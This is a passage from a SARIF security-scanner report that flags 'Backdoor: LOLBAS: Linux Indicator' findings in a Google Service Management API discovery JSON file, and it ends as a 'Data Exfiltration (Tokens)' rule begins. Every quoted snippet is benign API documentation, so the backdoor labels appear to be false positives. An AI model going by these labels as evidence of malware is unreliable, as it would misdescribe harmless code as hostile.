            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 447,
                  "startColumn": 2307,
                  "endLine": 447,
                  "endColumn": 2316,
                  "snippet": {
                    "text": "he mixin is specified, it should be a\\nrelative path under which inherited HTTP paths are placed. Example:\\n\\n    apis:\\n    - name: google.storage.v2.Storage\\n      mixins:\\n      - name: google.acl.v1.AccessControl\\n        root: acls\\n\\nThis implies the following inherited HTTP annotation:\\n\\n    service Storage {\\n      \\/\\/ Get the underlying ACL object.\\n      rpc GetAcl(GetAclRequest) returns (Acl) {\\n        option (google.api.http).get = \\\"\\/v2\\/acls\\/{resource=**}:getAcl\\\";\\n      }\\n      ...\\n    }\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"T",
                    "rendered": {
                      "text": "he mixin is specified, it should be a\\nrelative path under which inherited HTTP paths are placed. Example:\\n\\n    apis:\\n    - name: google.storage.v2.Storage\\n      mixins:\\n      - name: google.acl.v1.AccessControl\\n        root: acls\\n\\nThis implies the following inherited HTTP annotation:\\n\\n    service Storage {\\n      \\/\\/ Get the underlying ACL object.\\n      rpc GetAcl(GetAclRequest) returns (Acl) {\\n        option (google.api.http).get = \\\"\\/v2\\/acls\\/{resource=**}:getAcl\\\";\\n      }\\n      ...\\n    }\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"T",
                      "markdown": "`he mixin is specified, it should be a\\nrelative path under which inherited HTTP paths are placed. Example:\\n\\n    apis:\\n    - name: google.storage.v2.Storage\\n      mixins:\\n      - name: google.acl.v1.AccessControl\\n        root: acls\\n\\nThis implies the following inherited HTTP annotation:\\n\\n    service Storage {\\n      \\/\\/ Get the underlying ACL object.\\n      rpc GetAcl(GetAclRequest) returns (Acl) {\\n        option (google.api.http).get = \\\"\\/v2\\/acls\\/{resource=**}:getAcl\\\";\\n      }\\n      ...\\n    }\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"T`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 447,
                  "startColumn": 1699,
                  "endLine": 447,
                  "endColumn": 1708,
                  "snippet": {
                    "text": "mixin construct implies that all methods in `AccessControl` are\\nalso declared with same name and request\\/response types in\\n`Storage`. A documentation generator or annotation processor will\\nsee the effective `Storage.GetAcl` method after inherting\\ndocumentation and annotations as follows:\\n\\n    service Storage {\\n      \\/\\/ Get the underlying ACL object.\\n      rpc GetAcl(GetAclRequest) returns (Acl) {\\n        option (google.api.http).get = \\\"\\/v2\\/{resource=**}:getAcl\\\";\\n      }\\n      ...\\n    }\\n\\nNote how the version in the path pattern changed from `v1` to `v2`.\\n\\nIf the `root` field in th",
                    "rendered": {
                      "text": "mixin construct implies that all methods in `AccessControl` are\\nalso declared with same name and request\\/response types in\\n`Storage`. A documentation generator or annotation processor will\\nsee the effective `Storage.GetAcl` method after inherting\\ndocumentation and annotations as follows:\\n\\n    service Storage {\\n      \\/\\/ Get the underlying ACL object.\\n      rpc GetAcl(GetAclRequest) returns (Acl) {\\n        option (google.api.http).get = \\\"\\/v2\\/{resource=**}:getAcl\\\";\\n      }\\n      ...\\n    }\\n\\nNote how the version in the path pattern changed from `v1` to `v2`.\\n\\nIf the `root` field in th",
                      "markdown": "`mixin construct implies that all methods in `AccessControl` are\\nalso declared with same name and request\\/response types in\\n`Storage`. A documentation generator or annotation processor will\\nsee the effective `Storage.GetAcl` method after inherting\\ndocumentation and annotations as follows:\\n\\n    service Storage {\\n      \\/\\/ Get the underlying ACL object.\\n      rpc GetAcl(GetAclRequest) returns (Acl) {\\n        option (google.api.http).get = \\\"\\/v2\\/{resource=**}:getAcl\\\";\\n      }\\n      ...\\n    }\\n\\nNote how the version in the path pattern changed from `v1` to `v2`.\\n\\nIf the `root` field in th`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 447,
                  "startColumn": 1001,
                  "endLine": 447,
                  "endColumn": 1010,
                  "snippet": {
                    "text": "ple of a simple mixin:\\n\\n    package google.acl.v1;\\n    service AccessControl {\\n      \\/\\/ Get the underlying ACL object.\\n      rpc GetAcl(GetAclRequest) returns (Acl) {\\n        option (google.api.http).get = \\\"\\/v1\\/{resource=**}:getAcl\\\";\\n      }\\n    }\\n\\n    package google.storage.v2;\\n    service Storage {\\n      \\/\\/       rpc GetAcl(GetAclRequest) returns (Acl);\\n\\n      \\/\\/ Get a data record.\\n      rpc GetData(GetDataRequest) returns (Data) {\\n        option (google.api.http).get = \\\"\\/v2\\/{resource=**}\\\";\\n      }\\n    }\\n\\nExample of a mixin configuration:\\n\\n    apis:\\n    - name: go",
                    "rendered": {
                      "text": "ple of a simple mixin:\\n\\n    package google.acl.v1;\\n    service AccessControl {\\n      \\/\\/ Get the underlying ACL object.\\n      rpc GetAcl(GetAclRequest) returns (Acl) {\\n        option (google.api.http).get = \\\"\\/v1\\/{resource=**}:getAcl\\\";\\n      }\\n    }\\n\\n    package google.storage.v2;\\n    service Storage {\\n      \\/\\/       rpc GetAcl(GetAclRequest) returns (Acl);\\n\\n      \\/\\/ Get a data record.\\n      rpc GetData(GetDataRequest) returns (Data) {\\n        option (google.api.http).get = \\\"\\/v2\\/{resource=**}\\\";\\n      }\\n    }\\n\\nExample of a mixin configuration:\\n\\n    apis:\\n    - name: go",
                      "markdown": "`ple of a simple mixin:\\n\\n    package google.acl.v1;\\n    service AccessControl {\\n      \\/\\/ Get the underlying ACL object.\\n      rpc GetAcl(GetAclRequest) returns (Acl) {\\n        option (google.api.http).get = \\\"\\/v1\\/{resource=**}:getAcl\\\";\\n      }\\n    }\\n\\n    package google.storage.v2;\\n    service Storage {\\n      \\/\\/       rpc GetAcl(GetAclRequest) returns (Acl);\\n\\n      \\/\\/ Get a data record.\\n      rpc GetData(GetDataRequest) returns (Data) {\\n        option (google.api.http).get = \\\"\\/v2\\/{resource=**}\\\";\\n      }\\n    }\\n\\nExample of a mixin configuration:\\n\\n    apis:\\n    - name: go`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 447,
                  "startColumn": 758,
                  "endLine": 447,
                  "endColumn": 767,
                  "snippet": {
                    "text": "declared method will be\\n  inherited.\\n\\n- If an http annotation is inherited, the path pattern will be\\n  modified as follows. Any version prefix will be replaced by the\\n  version of the including API plus the root path if specified.\\n\\nExample of a simple mixin:\\n\\n    package google.acl.v1;\\n    service AccessControl {\\n      \\/\\/ Get the underlying ACL object.\\n      rpc GetAcl(GetAclRequest) returns (Acl) {\\n        option (google.api.http).get = \\\"\\/v1\\/{resource=**}:getAcl\\\";\\n      }\\n    }\\n\\n    package google.storage.v2;\\n    service Storage {\\n      \\/\\/       rpc GetAcl(GetAclRequest) ret",
                    "rendered": {
                      "text": "declared method will be\\n  inherited.\\n\\n- If an http annotation is inherited, the path pattern will be\\n  modified as follows. Any version prefix will be replaced by the\\n  version of the including API plus the root path if specified.\\n\\nExample of a simple mixin:\\n\\n    package google.acl.v1;\\n    service AccessControl {\\n      \\/\\/ Get the underlying ACL object.\\n      rpc GetAcl(GetAclRequest) returns (Acl) {\\n        option (google.api.http).get = \\\"\\/v1\\/{resource=**}:getAcl\\\";\\n      }\\n    }\\n\\n    package google.storage.v2;\\n    service Storage {\\n      \\/\\/       rpc GetAcl(GetAclRequest) ret",
                      "markdown": "`declared method will be\\n  inherited.\\n\\n- If an http annotation is inherited, the path pattern will be\\n  modified as follows. Any version prefix will be replaced by the\\n  version of the including API plus the root path if specified.\\n\\nExample of a simple mixin:\\n\\n    package google.acl.v1;\\n    service AccessControl {\\n      \\/\\/ Get the underlying ACL object.\\n      rpc GetAcl(GetAclRequest) returns (Acl) {\\n        option (google.api.http).get = \\\"\\/v1\\/{resource=**}:getAcl\\\";\\n      }\\n    }\\n\\n    package google.storage.v2;\\n    service Storage {\\n      \\/\\/       rpc GetAcl(GetAclRequest) ret`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 447,
                  "startColumn": 394,
                  "endLine": 447,
                  "endColumn": 403,
                  "snippet": {
                    "text": "clare all the methods from the included API, but documentation\\nand options are inherited as follows:\\n\\n- If after comment and whitespace stripping, the documentation\\n  string of the redeclared method is empty, it will be inherited\\n  from the original method.\\n\\n- Each annotation belonging to the service config (http,\\n  visibility) which is not set in the redeclared method will be\\n  inherited.\\n\\n- If an http annotation is inherited, the path pattern will be\\n  modified as follows. Any version prefix will be replaced by the\\n  version of the including API plus the root path if specified.\\n\\nExampl",
                    "rendered": {
                      "text": "clare all the methods from the included API, but documentation\\nand options are inherited as follows:\\n\\n- If after comment and whitespace stripping, the documentation\\n  string of the redeclared method is empty, it will be inherited\\n  from the original method.\\n\\n- Each annotation belonging to the service config (http,\\n  visibility) which is not set in the redeclared method will be\\n  inherited.\\n\\n- If an http annotation is inherited, the path pattern will be\\n  modified as follows. Any version prefix will be replaced by the\\n  version of the including API plus the root path if specified.\\n\\nExampl",
                      "markdown": "`clare all the methods from the included API, but documentation\\nand options are inherited as follows:\\n\\n- If after comment and whitespace stripping, the documentation\\n  string of the redeclared method is empty, it will be inherited\\n  from the original method.\\n\\n- Each annotation belonging to the service config (http,\\n  visibility) which is not set in the redeclared method will be\\n  inherited.\\n\\n- If an http annotation is inherited, the path pattern will be\\n  modified as follows. Any version prefix will be replaced by the\\n  version of the including API plus the root path if specified.\\n\\nExampl`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 345,
                  "startColumn": 64,
                  "endLine": 345,
                  "endColumn": 73,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"sourceContext\": {\n          \"description\": \"Source context for the protocol buffer service represented by this\\nmessage.\",\n          \"$ref\": \"SourceContext\"\n        },\n        \"mixins\": {\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"sourceContext\": {\n          \"description\": \"Source context for the protocol buffer service represented by this\\nmessage.\",\n          \"$ref\": \"SourceContext\"\n        },\n        \"mixins\": {\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"sourceContext\": {\n          \"description\": \"Source context for the protocol buffer service represented by this\\nmessage.\",\n          \"$ref\": \"SourceContext\"\n        },\n        \"mixins\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 341,
                  "startColumn": 666,
                  "endLine": 341,
                  "endColumn": 674,
                  "snippet": {
                    "text": " be verified to be consistent with what is\\nprovided here.\\n\\nThe versioning schema uses [semantic\\nversioning](http:\\/\\/semver.org) where the major version number\\nindicates a breaking change and the minor version an additive,\\nnon-breaking change. Both version numbers are signals to users\\nwhat to expect from different versions, and should be carefully\\nchosen based on the product plan.\\n\\nThe major version is also reflected in the package name of the\\nAPI, which must end in `v<major-version>`, as in\\n`google.feature.v1`. For major versions 0 and 1, the suffix can\\nbe omitted. Zero major versions mu",
                    "rendered": {
                      "text": " be verified to be consistent with what is\\nprovided here.\\n\\nThe versioning schema uses [semantic\\nversioning](http:\\/\\/semver.org) where the major version number\\nindicates a breaking change and the minor version an additive,\\nnon-breaking change. Both version numbers are signals to users\\nwhat to expect from different versions, and should be carefully\\nchosen based on the product plan.\\n\\nThe major version is also reflected in the package name of the\\nAPI, which must end in `v<major-version>`, as in\\n`google.feature.v1`. For major versions 0 and 1, the suffix can\\nbe omitted. Zero major versions mu",
                      "markdown": "` be verified to be consistent with what is\\nprovided here.\\n\\nThe versioning schema uses [semantic\\nversioning](http:\\/\\/semver.org) where the major version number\\nindicates a breaking change and the minor version an additive,\\nnon-breaking change. Both version numbers are signals to users\\nwhat to expect from different versions, and should be carefully\\nchosen based on the product plan.\\n\\nThe major version is also reflected in the package name of the\\nAPI, which must end in `v<major-version>`, as in\\n`google.feature.v1`. For major versions 0 and 1, the suffix can\\nbe omitted. Zero major versions mu`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 268,
                  "startColumn": 47,
                  "endLine": 268,
                  "endColumn": 56,
                  "snippet": {
                    "text": "          \"$ref\": \"ProjectProperties\"\n        },\n        \"control\": {\n          \"description\": \"Configuration for the service control plane.\",\n          \"$ref\": \"Control\"\n        },\n        \"logs\": {\n",
                    "rendered": {
                      "text": "          \"$ref\": \"ProjectProperties\"\n        },\n        \"control\": {\n          \"description\": \"Configuration for the service control plane.\",\n          \"$ref\": \"Control\"\n        },\n        \"logs\": {\n",
                      "markdown": "`          \"$ref\": \"ProjectProperties\"\n        },\n        \"control\": {\n          \"description\": \"Configuration for the service control plane.\",\n          \"$ref\": \"Control\"\n        },\n        \"logs\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 203,
                  "startColumn": 127,
                  "endLine": 203,
                  "endColumn": 136,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"producerProjectId\": {\n          \"description\": \"The id of the Google developer project that owns the service.\\nMembers of this project can manage the service configuration,\\nmanage consumption of the service, etc.\",\n          \"type\": \"string\"\n        },\n        \"apis\": {\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"producerProjectId\": {\n          \"description\": \"The id of the Google developer project that owns the service.\\nMembers of this project can manage the service configuration,\\nmanage consumption of the service, etc.\",\n          \"type\": \"string\"\n        },\n        \"apis\": {\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"producerProjectId\": {\n          \"description\": \"The id of the Google developer project that owns the service.\\nMembers of this project can manage the service configuration,\\nmanage consumption of the service, etc.\",\n          \"type\": \"string\"\n        },\n        \"apis\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 191,
                  "startColumn": 55,
                  "endLine": 191,
                  "endColumn": 64,
                  "snippet": {
                    "text": "          \"format\": \"uint32\"\n        },\n        \"name\": {\n          \"description\": \"The DNS address at which this service is available,\\ne.g. `calendar.googleapis.com`.\",\n          \"type\": \"string\"\n        },\n        \"id\": {\n",
                    "rendered": {
                      "text": "          \"format\": \"uint32\"\n        },\n        \"name\": {\n          \"description\": \"The DNS address at which this service is available,\\ne.g. `calendar.googleapis.com`.\",\n          \"type\": \"string\"\n        },\n        \"id\": {\n",
                      "markdown": "`          \"format\": \"uint32\"\n        },\n        \"name\": {\n          \"description\": \"The DNS address at which this service is available,\\ne.g. `calendar.googleapis.com`.\",\n          \"type\": \"string\"\n        },\n        \"id\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 44,
                  "endLine": 186,
                  "endColumn": 53,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"configVersion\": {\n          \"description\": \"The version of the service configuration. The config version may\\ninfluence interpretation of the configuration, for example, to\\ndetermine defaults. This is documented together with applicable\\noptions. The current default for the config version itself is `3`.\",\n          \"type\": \"integer\",\n          \"format\": \"uint32\"\n        },\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"configVersion\": {\n          \"description\": \"The version of the service configuration. The config version may\\ninfluence interpretation of the configuration, for example, to\\ndetermine defaults. This is documented together with applicable\\noptions. The current default for the config version itself is `3`.\",\n          \"type\": \"integer\",\n          \"format\": \"uint32\"\n        },\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"configVersion\": {\n          \"description\": \"The version of the service configuration. The config version may\\ninfluence interpretation of the configuration, for example, to\\ndetermine defaults. This is documented together with applicable\\noptions. The current default for the config version itself is `3`.\",\n          \"type\": \"integer\",\n          \"format\": \"uint32\"\n        },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 132,
                  "endLine": 182,
                  "endColumn": 141,
                  "snippet": {
                    "text": "iew of settings for a particular consumer project, if requested.\",\n          \"$ref\": \"ProjectSettings\"\n        }\n      }\n    },\n    \"Service\": {\n      \"id\": \"Service\",\n      \"description\": \"`Service` is the root object of the configuration schema. It\\ndescribes basic information like the name of the service and the\\nexposed API interfaces, and delegates other aspects to configuration\\nsub-sections.\\n\\nExample:\\n\\n    type: google.api.Service\\n    config_version: 1\\n    name: calendar.googleapis.com\\n    title: Google Calendar API\\n    apis:\\n    - name: google.calendar.Calendar\\n    backend:\\n      rul",
                    "rendered": {
                      "text": "iew of settings for a particular consumer project, if requested.\",\n          \"$ref\": \"ProjectSettings\"\n        }\n      }\n    },\n    \"Service\": {\n      \"id\": \"Service\",\n      \"description\": \"`Service` is the root object of the configuration schema. It\\ndescribes basic information like the name of the service and the\\nexposed API interfaces, and delegates other aspects to configuration\\nsub-sections.\\n\\nExample:\\n\\n    type: google.api.Service\\n    config_version: 1\\n    name: calendar.googleapis.com\\n    title: Google Calendar API\\n    apis:\\n    - name: google.calendar.Calendar\\n    backend:\\n      rul",
                      "markdown": "`iew of settings for a particular consumer project, if requested.\",\n          \"$ref\": \"ProjectSettings\"\n        }\n      }\n    },\n    \"Service\": {\n      \"id\": \"Service\",\n      \"description\": \"`Service` is the root object of the configuration schema. It\\ndescribes basic information like the name of the service and the\\nexposed API interfaces, and delegates other aspects to configuration\\nsub-sections.\\n\\nExample:\\n\\n    type: google.api.Service\\n    config_version: 1\\n    name: calendar.googleapis.com\\n    title: Google Calendar API\\n    apis:\\n    - name: google.calendar.Calendar\\n    backend:\\n      rul`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 128,
                  "endLine": 143,
                  "endColumn": 137,
                  "snippet": {
                    "text": "    },\n    \"ManagedService\": {\n      \"id\": \"ManagedService\",\n      \"description\": \"The full representation of an API Service that is managed by the\\n`ServiceManager` API.  Includes both the service configuration, as well as\\nother control plane deployment related information.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n",
                    "rendered": {
                      "text": "    },\n    \"ManagedService\": {\n      \"id\": \"ManagedService\",\n      \"description\": \"The full representation of an API Service that is managed by the\\n`ServiceManager` API.  Includes both the service configuration, as well as\\nother control plane deployment related information.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n",
                      "markdown": "`    },\n    \"ManagedService\": {\n      \"id\": \"ManagedService\",\n      \"description\": \"The full representation of an API Service that is managed by the\\n`ServiceManager` API.  Includes both the service configuration, as well as\\nother control plane deployment related information.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 55,
                  "endLine": 143,
                  "endColumn": 64,
                  "snippet": {
                    "text": "    },\n    \"ManagedService\": {\n      \"id\": \"ManagedService\",\n      \"description\": \"The full representation of an API Service that is managed by the\\n`ServiceManager` API.  Includes both the service configuration, as well as\\nother control plane deployment related information.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n",
                    "rendered": {
                      "text": "    },\n    \"ManagedService\": {\n      \"id\": \"ManagedService\",\n      \"description\": \"The full representation of an API Service that is managed by the\\n`ServiceManager` API.  Includes both the service configuration, as well as\\nother control plane deployment related information.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n",
                      "markdown": "`    },\n    \"ManagedService\": {\n      \"id\": \"ManagedService\",\n      \"description\": \"The full representation of an API Service that is managed by the\\n`ServiceManager` API.  Includes both the service configuration, as well as\\nother control plane deployment related information.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 117,
                  "startColumn": 48,
                  "endLine": 117,
                  "endColumn": 57,
                  "snippet": {
                    "text": "          \"description\": \"View and manage your data across Google Cloud Platform services\"\n        },\n        \"https://www.googleapis.com/auth/service.management\": {\n          \"description\": \"Manage your Google API service configuration\"\n        }\n      }\n    }\n",
                    "rendered": {
                      "text": "          \"description\": \"View and manage your data across Google Cloud Platform services\"\n        },\n        \"https://www.googleapis.com/auth/service.management\": {\n          \"description\": \"Manage your Google API service configuration\"\n        }\n      }\n    }\n",
                      "markdown": "`          \"description\": \"View and manage your data across Google Cloud Platform services\"\n        },\n        \"https://www.googleapis.com/auth/service.management\": {\n          \"description\": \"Manage your Google API service configuration\"\n        }\n      }\n    }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 21,
                  "endLine": 9,
                  "endColumn": 30,
                  "snippet": {
                    "text": "  \"version\": \"v1\",\n  \"revision\": \"0\",\n  \"title\": \"Google Service Management API\",\n  \"description\": \"The service management API for Google Cloud Platform\",\n  \"ownerDomain\": \"google.com\",\n  \"ownerName\": \"Google\",\n  \"icons\": {\n",
                    "rendered": {
                      "text": "  \"version\": \"v1\",\n  \"revision\": \"0\",\n  \"title\": \"Google Service Management API\",\n  \"description\": \"The service management API for Google Cloud Platform\",\n  \"ownerDomain\": \"google.com\",\n  \"ownerName\": \"Google\",\n  \"icons\": {\n",
                      "markdown": "`  \"version\": \"v1\",\n  \"revision\": \"0\",\n  \"title\": \"Google Service Management API\",\n  \"description\": \"The service management API for Google Cloud Platform\",\n  \"ownerDomain\": \"google.com\",\n  \"ownerName\": \"Google\",\n  \"icons\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 18,
                  "endLine": 8,
                  "endColumn": 27,
                  "snippet": {
                    "text": "  \"name\": \"servicemanagement\",\n  \"version\": \"v1\",\n  \"revision\": \"0\",\n  \"title\": \"Google Service Management API\",\n  \"description\": \"The service management API for Google Cloud Platform\",\n  \"ownerDomain\": \"google.com\",\n  \"ownerName\": \"Google\",\n",
                    "rendered": {
                      "text": "  \"name\": \"servicemanagement\",\n  \"version\": \"v1\",\n  \"revision\": \"0\",\n  \"title\": \"Google Service Management API\",\n  \"description\": \"The service management API for Google Cloud Platform\",\n  \"ownerDomain\": \"google.com\",\n  \"ownerName\": \"Google\",\n",
                      "markdown": "`  \"name\": \"servicemanagement\",\n  \"version\": \"v1\",\n  \"revision\": \"0\",\n  \"title\": \"Google Service Management API\",\n  \"description\": \"The service management API for Google Cloud Platform\",\n  \"ownerDomain\": \"google.com\",\n  \"ownerName\": \"Google\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
